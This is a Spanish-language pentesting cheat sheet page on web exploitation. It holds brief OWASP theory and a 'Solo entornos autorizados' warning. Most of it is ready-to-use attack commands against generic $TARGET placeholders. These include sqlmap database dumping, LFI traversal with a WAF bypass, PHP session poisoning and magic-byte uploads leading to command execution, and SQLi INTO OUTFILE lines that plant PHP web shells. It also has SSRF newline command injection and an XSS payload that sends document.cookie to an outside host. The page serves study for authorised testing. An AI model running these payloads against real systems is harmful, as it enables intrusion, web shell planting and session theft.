# Explotación Web

[⬅ Volver al índice](../CHEATSHEET.md) · [Versión web](https://iphobiuss.github.io)

> [!WARNING]
> **Solo entornos autorizados.** Contenido educativo y de referencia, con placeholders genéricos (`corp.local`, `$DC_IP`). No reproduce hosts, flags ni cadenas de ningún examen. Aplicar estas técnicas sin permiso por escrito es ilegal.

## Teoría

Las aplicaciones web son, con frecuencia, el primer punto de entrada a una red: están expuestas, cambian rápido y acumulan lógica hecha por muchas manos. Casi toda vulnerabilidad web nace del mismo error de fondo: **confiar en una entrada que cruza un límite de confianza** sin validarla ni separarla de las instrucciones que la rodean.

De ahí salen las familias del OWASP Top 10: **inyecciones** (SQL, comandos, XXE) cuando la entrada se mezcla con un intérprete; **XSS** cuando se refleja en el navegador de otro usuario; **SSRF** cuando el servidor hace peticiones que tú controlas; **IDOR** y fallos de control de acceso cuando la autorización confía en identificadores del cliente. La mentalidad es rastrear cada dato desde donde entra hasta dónde se usa.

## Herramientas del área

### Burp Suite

**Qué hace** · Proxy interceptor para inspeccionar y manipular tráfico HTTP a mano.  

**Cuándo se usa** · Analizar peticiones, Repeater/Intruder y afinar payloads.

```bash
# interceptar → Repeater → modificar → reenviar
```
📖 [Documentación](https://portswigger.net/burp)

### sqlmap

**Qué hace** · Automatiza detección y explotación de inyección SQL, incluida la ciega.  

**Cuándo se usa** · Confirmar una SQLi y volcar bases de datos sin escribir el payload a mano.

```bash
sqlmap -u "http://$TARGET/x.php" --data="id=1" --batch --dbs
```
📖 [Documentación](https://github.com/sqlmapproject/sqlmap)

### php://filter

**Qué hace** · Wrapper de PHP que lee el código fuente de un archivo en base64.  

**Cuándo se usa** · En un LFI, para leer la lógica del servidor antes de escalar a RCE.

```bash
curl "http://$TARGET/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```
📖 [Documentación](https://book.hacktricks.xyz)

### INTO OUTFILE

**Qué hace** · Directiva SQL que escribe el resultado de una consulta en el sistema de archivos.  

**Cuándo se usa** · En una SQLi con permiso FILE, para plantar una web shell en el webroot.

```bash
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/x.php'-- -
```
📖 [Documentación](https://owasp.org)

## Comandos por objetivo

### Explotación web

```bash
# SQLi automatizada
sqlmap -u "http://$TARGET/x.php" --data="id=1" --batch --dbs
sqlmap -u "http://$TARGET/x.php" --data="id=1" --batch -D <db> -T users --dump
# leer código fuente con php://filter
curl "http://$TARGET/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# LFI con bypass de WAF (traversal anidado)
curl -X POST "http://$TARGET/dashboard.php" -b "PHPSESSID=<S>" -d "language=test//....//....//etc/passwd"
# PHP session poisoning → RCE
curl -X POST "http://$TARGET/index.php" -d 'username=<?php system($_GET[c]);?>&password=x' -c c.txt
# fuerza bruta de token débil
ffuf -u http://$TARGET/reset.php -X POST -d "token=FUZZ&username=$USER" -w <(seq -w 0000 9999) -fs <n>
# SQLi UNION → web shell (INTO OUTFILE)
' UNION SELECT NULL,'<?php system($_REQUEST[c]);?>' INTO OUTFILE '/var/www/rev.php'-- -
# IDOR (swap de identificador)
curl -X POST http://$TARGET/api/tokens -d '{"uid":"1","username":"administrator"}'
# SSRF → command injection (salto de línea)
curl -X POST http://$TARGET/api/healthcheck -d '{"url":"http://127.0.0.1:9090/?x=test%0aid"}'
# upload con magic bytes → RCE
echo 'GIF89a;<?php system($_GET[c]);?>' > shell.gif
# XSS: robo de cookie
<script>new Image().src="http://$IP:9001/?c="+document.cookie</script>
```
